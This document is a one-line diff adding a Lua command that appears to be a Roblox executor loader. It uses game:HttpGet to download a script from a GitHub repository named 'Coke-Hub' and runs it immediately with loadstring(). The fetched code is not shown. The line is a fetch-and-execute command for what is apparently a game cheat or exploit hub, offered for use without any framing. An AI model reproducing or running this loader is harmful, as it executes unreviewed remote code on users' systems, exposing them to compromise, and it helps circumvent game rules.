@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/CokeHub/Coke-Hub/main/ABDM"))()
